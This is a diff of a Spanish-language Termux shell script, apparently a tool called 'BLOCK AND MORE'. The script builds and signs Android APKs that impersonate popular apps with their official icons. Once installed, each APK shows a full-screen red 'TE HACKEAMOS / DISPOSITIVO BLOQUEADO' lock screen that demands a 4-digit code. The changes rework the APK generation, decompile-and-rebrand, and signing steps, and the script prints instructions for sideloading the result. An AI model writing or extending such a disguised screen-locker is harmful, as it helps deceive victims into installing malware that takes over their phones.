@@ -16,7 +16,7 @@ echo "   ██████╔╝██║     ██║   ██║██║   
 echo "   ██╔══██╗██║     ██║   ██║██║     ██╔═██╗ "
 echo "   ██████╔╝███████╗╚██████╔╝╚██████╗██║  ██╗"
 echo "   ╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝"
-echo -e "${AMARILLO}        [ BLOCK AND MORE v10 ]${NC}\n"
+echo -e "${AMARILLO}        [ BLOCK AND MORE v11 ]${NC}\n"
 
 # ============================================
 # LISTA DE APPS
@@ -28,7 +28,7 @@ APPS=(
 )
 
 # ============================================
-# ICONOS
+# ICONOS DE APPS
 # ============================================
 get_icon_url() {
     case "$1" in
@@ -86,28 +86,29 @@ generar_apk() {
     # ============================================
     echo -e "${AMARILLO}[*] Descargando APK base...${NC}"
     
-    # Descargar una APK simple de ejemplo (calculadora)
-    wget -q -O base.apk "https://raw.githubusercontent.com/emanuelyoan470/Mi-herramienta/main/base.apk" 2>/dev/null
+    # Descargar APK de calculadora simple (funciona como base)
+    BASE_URL="https://raw.githubusercontent.com/emanuelyoan470/Mi-herramienta/main/base.apk"
+    wget -q -O base.apk "$BASE_URL" 2>/dev/null
     
-    if [ ! -f "base.apk" ]; then
-        echo -e "${ROJO}[!] No se pudo descargar la APK base.${NC}"
-        echo -e "${AMARILLO}[*] Creando APK desde cero...${NC}"
+    # Si falla, crear una APK manualmente
+    if [ ! -f "base.apk" ] || [ ! -s "base.apk" ]; then
+        echo -e "${AMARILLO}[!] No se pudo descargar, creando APK manual...${NC}"
         
-        # Crear una APK mínima funcional
+        # Crear APK simple con estructura mínima
         mkdir -p base_apk
         cd base_apk
         
         # AndroidManifest.xml
-        cat > AndroidManifest.xml << EOF
+        cat > AndroidManifest.xml << 'EOF'
 <?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
-    package="com.block.$app"
+    package="com.block.app"
     android:versionCode="1"
     android:versionName="1.0">
     <application
         android:allowBackup="true"
         android:icon="@drawable/ic_launcher"
-        android:label="$app"
+        android:label="@string/app_name"
         android:theme="@android:style/Theme.NoTitleBar.Fullscreen">
         <activity
             android:name=".MainActivity"
@@ -128,154 +129,170 @@ EOF
         mkdir -p res/layout
         cat > res/layout/main.xml << 'EOF'
 <?xml version="1.0" encoding="utf-8"?>
-<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
+<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
     android:layout_width="match_parent"
     android:layout_height="match_parent"
-    android:background="#CC0000">
-    <LinearLayout
-        android:layout_width="340dp"
+    android:orientation="vertical"
+    android:gravity="center"
+    android:background="#CC0000"
+    android:padding="20dp">
+    
+    <TextView
+        android:layout_width="wrap_content"
         android:layout_height="wrap_content"
-        android:layout_centerInParent="true"
+        android:text="⚠️"
+        android:textSize="70sp" />
+    
+    <TextView
+        android:layout_width="wrap_content"
+        android:layout_height="wrap_content"
+        android:text="¡TE HACKEAMOS!"
+        android:textColor="#FFFFFF"
+        android:textSize="32sp"
+        android:textStyle="bold"
+        android:layout_marginTop="10dp" />
+    
+    <TextView
+        android:layout_width="wrap_content"
+        android:layout_height="wrap_content"
+        android:text="🔒 DISPOSITIVO BLOQUEADO"
+        android:textColor="#FFFF00"
+        android:textSize="18sp"
+        android:layout_marginTop="5dp" />
+    
+    <TextView
+        android:layout_width="wrap_content"
+        android:layout_height="wrap_content"
+        android:text="Ingresa el código de 4 dígitos"
+        android:textColor="#FFFFFF"
+        android:textSize="14sp"
+        android:layout_marginTop="20dp"
+        android:layout_marginBottom="20dp" />
+    
+    <EditText
+        android:id="@+id/codigo"
+        android:layout_width="200dp"
+        android:layout_height="50dp"
+        android:background="#FFFFFF"
+        android:textColor="#000000"
+        android:textSize="24sp"
+        android:gravity="center"
+        android:inputType="number"
+        android:maxLength="4" />
+    
+    <Button
+        android:id="@+id/desbloquear"
+        android:layout_width="200dp"
+        android:layout_height="50dp"
+        android:text="🔓 DESBLOQUEAR"
+        android:textColor="#FFFFFF"
+        android:textSize="16sp"
+        android:textStyle="bold"
         android:background="#FF0000"
-        android:padding="25dp"
-        android:orientation="vertical"
-        android:elevation="15dp">
-        <TextView
-            android:layout_width="wrap_content"
-            android:layout_height="wrap_content"
-            android:layout_gravity="center"
-            android:text="⚠️"
-            android:textSize="60sp" />
-        <TextView
-            android:layout_width="wrap_content"
-            android:layout_height="wrap_content"
-            android:layout_gravity="center"
-            android:text="¡TE HACKEAMOS!"
-            android:textColor="#FFFFFF"
-            android:textSize="28sp"
-            android:textStyle="bold"
-            android:layout_marginTop="5dp" />
-        <TextView
-            android:layout_width="wrap_content"
-            android:layout_height="wrap_content"
-            android:layout_gravity="center"
-            android:text="🔒 DISPOSITIVO BLOQUEADO"
-            android:textColor="#FFFF00"
-            android:textSize="16sp"
-            android:layout_marginTop="5dp" />
-        <TextView
-            android:layout_width="wrap_content"
-            android:layout_height="wrap_content"
-            android:layout_gravity="center"
-            android:text="Ingresa el código de 4 dígitos"
-            android:textColor="#FFFFFF"
-            android:textSize="13sp"
-            android:gravity="center"
-            android:layout_marginTop="15dp"
-            android:layout_marginBottom="15dp" />
-        <EditText
-            android:id="@+id/codigo"
-            android:layout_width="200dp"
-            android:layout_height="50dp"
-            android:layout_gravity="center"
-            android:background="#FFFFFF"
-            android:textColor="#000000"
-            android:textSize="24sp"
-            android:gravity="center"
-            android:inputType="number"
-            android:maxLength="4" />
-        <Button
-            android:id="@+id/desbloquear"
-            android:layout_width="200dp"
-            android:layout_height="50dp"
-            android:layout_gravity="center"
-            android:text="🔓 DESBLOQUEAR"
-            android:textColor="#FFFFFF"
-            android:textSize="16sp"
-            android:textStyle="bold"
-            android:background="#FF0000"
-            android:layout_marginTop="15dp" />
-        <TextView
-            android:id="@+id/error"
-            android:layout_width="wrap_content"
-            android:layout_height="wrap_content"
-            android:layout_gravity="center"
-            android:text=""
-            android:textColor="#FFFF00"
-            android:textSize="13sp"
-            android:layout_marginTop="10dp" />
-        <TextView
-            android:id="@+id/timer"
-            android:layout_width="wrap_content"
-            android:layout_height="wrap_content"
-            android:layout_gravity="center"
-            android:text=""
-            android:textColor="#FFFFFF"
-            android:textSize="14sp"
-            android:layout_marginTop="5dp" />
-    </LinearLayout>
-</RelativeLayout>
+        android:layout_marginTop="15dp" />
+    
+    <TextView
+        android:id="@+id/error"
+        android:layout_width="wrap_content"
+        android:layout_height="wrap_content"
+        android:text=""
+        android:textColor="#FFFF00"
+        android:textSize="14sp"
+        android:layout_marginTop="10dp" />
+        
+    <TextView
+        android:id="@+id/timer"
+        android:layout_width="wrap_content"
+        android:layout_height="wrap_content"
+        android:text=""
+        android:textColor="#FFFFFF"
+        android:textSize="14sp"
+        android:layout_marginTop="5dp" />
+        
+</LinearLayout>
 EOF
 
         # Strings
         mkdir -p res/values
-        cat > res/values/strings.xml << EOF
+        cat > res/values/strings.xml << 'EOF'
 <?xml version="1.0" encoding="utf-8"?>
 <resources>
-    <string name="app_name">$app</string>
+    <string name="app_name">Block App</string>
 </resources>
 EOF
 
         cd ..
         
         # Empaquetar con apktool
-        apktool b base_apk -o app_unsigned.apk 2>/dev/null
+        apktool b base_apk -o base.apk 2>/dev/null
         
-        if [ ! -f "app_unsigned.apk" ]; then
+        if [ ! -f "base.apk" ]; then
             cd base_apk
-            zip -r ../app_unsigned.apk * 2>/dev/null
+            zip -r ../base.apk * 2>/dev/null
             cd ..
-        fi
-    else
-        # Si se descargó la base, descompilar y modificar
-        apktool d base.apk -o decoded 2>/dev/null
-        
-        if [ -d "decoded" ]; then
-            # Cambiar nombre de la app
-            find decoded -name "AndroidManifest.xml" -exec sed -i "s/Block Phone/$app/g" {} \;
-            find decoded -name "strings.xml" -exec sed -i "s/Block Phone/$app/g" {} \;
-            
-            # Cambiar icono
-            ICON_URL=$(get_icon_url "$app")
-            wget -q -O icon.png "$ICON_URL" 2>/dev/null
-            
-            if [ ! -f "icon.png" ]; then
-                echo "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==" | base64 -d > icon.png
-            fi
-            
-            find decoded -type d -name "drawable*" -exec cp icon.png {}/ic_launcher.png \; 2>/dev/null
-            find decoded -type d -name "mipmap*" -exec cp icon.png {}/ic_launcher.png \; 2>/dev/null
-            
-            rm -f icon.png
-            
-            # Inyectar código de desbloqueo
-            find decoded -name "*.smali" -exec sed -i "s/1234/$codigo/g" {} \; 2>/dev/null
-            
-            # Recompilar
-            apktool b decoded -o app_unsigned.apk 2>/dev/null
         fi
     fi
 
     # ============================================
-    # PASO 2: FIRMAR
+    # PASO 2: DECOMPILAR Y MODIFICAR
+    # ============================================
+    if [ -f "base.apk" ] && [ -s "base.apk" ]; then
+        echo -e "${AMARILLO}[*] Decompilando APK...${NC}"
+        apktool d base.apk -o decoded 2>/dev/null
+        
+        if [ -d "decoded" ]; then
+            echo -e "${AMARILLO}[*] Personalizando APK...${NC}"
+            
+            # Cambiar nombre de la app
+            find decoded -name "AndroidManifest.xml" -exec sed -i "s/Block App/$app/g" {} \;
+            find decoded -name "strings.xml" -exec sed -i "s/Block App/$app/g" {} \;
+            
+            # Cambiar código de desbloqueo (buscar en smali)
+            find decoded -name "*.smali" -exec sed -i "s/1234/$codigo/g" {} \;
+            
+            # Descargar icono
+            echo -e "${AMARILLO}[*] Descargando icono para: ${VERDE}$app${NC}"
+            ICON_URL=$(get_icon_url "$app")
+            wget -q -O icon.png "$ICON_URL" 2>/dev/null
+            
+            if [ ! -f "icon.png" ]; then
+                echo -e "${AMARILLO}[!] Usando icono genérico...${NC}"
+                echo "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==" | base64 -d > icon.png
+            fi
+            
+            # Copiar icono a todas las carpetas
+            find decoded -type d -name "drawable*" -exec cp icon.png {}/ic_launcher.png \; 2>/dev/null
+            find decoded -type d -name "mipmap*" -exec cp icon.png {}/ic_launcher.png \; 2>/dev/null
+            rm -f icon.png
+            
+            # Recompilar
+            echo -e "${AMARILLO}[*] Recompilando APK...${NC}"
+            apktool b decoded -o app_unsigned.apk 2>/dev/null
+        fi
+    fi
+
+    # Si falla, intentar método alternativo
+    if [ ! -f "app_unsigned.apk" ]; then
+        echo -e "${AMARILLO}[*] Usando método alternativo...${NC}"
+        if [ -d "decoded" ]; then
+            cd decoded
+            zip -r ../app_unsigned.apk * 2>/dev/null
+            cd ..
+        fi
+    fi
+
+    # ============================================
+    # PASO 3: FIRMAR LA APK
     # ============================================
     if [ -f "app_unsigned.apk" ] && [ -s "app_unsigned.apk" ]; then
         echo -e "${AMARILLO}[*] Firmando APK...${NC}"
         
+        # Generar keystore si no existe
         if [ ! -f ~/debug.keystore ]; then
             keytool -genkey -v -keystore ~/debug.keystore -alias debug -keyalg RSA -keysize 2048 -validity 10000 -dname "CN=Block, OU=Block, O=Phone, L=City, S=State, C=US" -storepass android -keypass android 2>/dev/null
         fi
         
+        # Firmar
         apksigner sign --ks ~/debug.keystore --ks-pass pass:android --key-pass pass:android --out "${app}_block.apk" app_unsigned.apk 2>/dev/null
         
         if [ ! -f "${app}_block.apk" ]; then
@@ -284,7 +301,7 @@ EOF
     fi
 
     # ============================================
-    # PASO 3: MOVER A DESCARGA
+    # PASO 4: MOVER A DESCARGA
     # ============================================
     if [ -f "${app}_block.apk" ] && [ -s "${app}_block.apk" ]; then
         mv "${app}_block.apk" ~/storage/downloads/
@@ -298,12 +315,7 @@ EOF
         echo -e "${BLANCO}[+] App: ${AMARILLO}$app${NC}"
         echo -e "${BLANCO}[+] Archivo: ${AMARILLO}~/storage/downloads/${app}_block.apk${NC}"
         echo -e "${BLANCO}[+] Código de desbloqueo: ${VERDE}$codigo${NC}"
-        echo -e "\n${VERDE}📱 LA APK TIENE:${NC}"
-        echo -e "   ✅ Icono oficial de $app"
-        echo -e "   ✅ Código de desbloqueo: $codigo"
-        echo -e "   ✅ Pantalla de bloqueo roja"
-        echo -e "   ✅ Sistema de espera por errores"
-        echo -e "\n${VERDE}📱 INSTRUCCIONES DE INSTALACIÓN:${NC}"
+        echo -e "\n${VERDE}📱 INSTRUCCIONES:${NC}"
         echo -e "  1. Activa 'Instalar apps de fuentes desconocidas'"
         echo -e "  2. Abre el archivo desde Descargas"
         echo -e "  3. Toca 'Instalar'"
@@ -312,6 +324,7 @@ EOF
         echo -e "${BLANCO}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"
     else
         echo -e "${ROJO}[!] Error al generar la APK.${NC}"
+        echo -e "${AMARILLO}[*] Asegúrate de tener conexión a internet y reinicia Termux.${NC}"
         cd ~
         rm -rf ~/block_temp
     fi
@@ -329,7 +342,7 @@ while true; do
     echo "   ██╔══██╗██║     ██║   ██║██║     ██╔═██╗ "
     echo "   ██████╔╝███████╗╚██████╔╝╚██████╗██║  ██╗"
     echo "   ╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝"
-    echo -e "${AMARILLO}        [ BLOCK AND MORE v10 ]${NC}\n"
+    echo -e "${AMARILLO}        [ BLOCK AND MORE v11 ]${NC}\n"
 
     mostrar_menu
     read -p ">> Selecciona una app (01-${#APPS[@]}): " opcion < /dev/tty
